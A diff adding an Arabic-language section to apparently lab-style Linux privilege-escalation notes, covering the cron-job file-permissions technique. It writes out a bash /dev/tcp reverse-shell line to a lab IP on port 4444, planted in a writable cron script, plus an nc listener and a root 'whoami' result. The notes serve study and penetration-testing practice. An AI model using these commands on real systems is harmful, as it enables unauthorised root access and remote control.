@@ -263,7 +263,59 @@ Used responsibly, this is a great example of **local privilege escalation** via 
 
 
 
+<details>
+  <summary>Cron Jobs</summary>
 
+
+* <details>
+     <summary>File Permissions</summary>
+
+
+    # Cron Jobs - File Permissions (Crontab)
+
+   ### 5) Cron Jobs - File Permissions
+
+   * **Cron Job** هو مهمه مجدوله مع تشغيلها تلقائيا في أوقات محدده
+    * الملف اللي فيه المهام المجدوله -> `/etc/crontab`
+
+   ---
+
+   **ex:**
+
+   * `cat /etc/crontab`
+    * وجدنا أن الملف ده -> `overwrite.sh`
+    * الآن نريد تحديد مكانه
+
+   * `locate overwrite.sh`
+       * `/usr/local/bin/overwrite.sh`
+    * لاقيناه وهنلاحظ انه قابل للتعديل
+
+
+   * `nano /usr/local/bin/overwrite.sh`
+       * `#!/bin/bash`
+       * `bash -i >& /dev/tcp/10.0.47.102/4444 0>&1` the ip of ``tun0``
+   
+    * هنستبدل محتوى الملف بالكود ده
+    * الكود ده بيخلى جهاز الضحيه يتصل بنا عن طريق ``NetCat`` على منفذ ``4444``
+    * وبعدين نحفظ الملف ونتاكد انه قابل للتنفيذ ``chmod +x``
+  
+
+   * `nc -nvlp 4444`
+    * ( الآن بنقوم بالإستماع على ال port 4444 )
+
+   * بمجرد ما الملف يخلص شغله هتكون راجعلنا بالجهاز
+   * بصلاحية Root عن طريق -> **Reverse Shell**
+
+   * `whoami` 
+       * `root`
+    * مبروك
+
+     
+   </details>
+
+
+  
+</details>
 
 
 
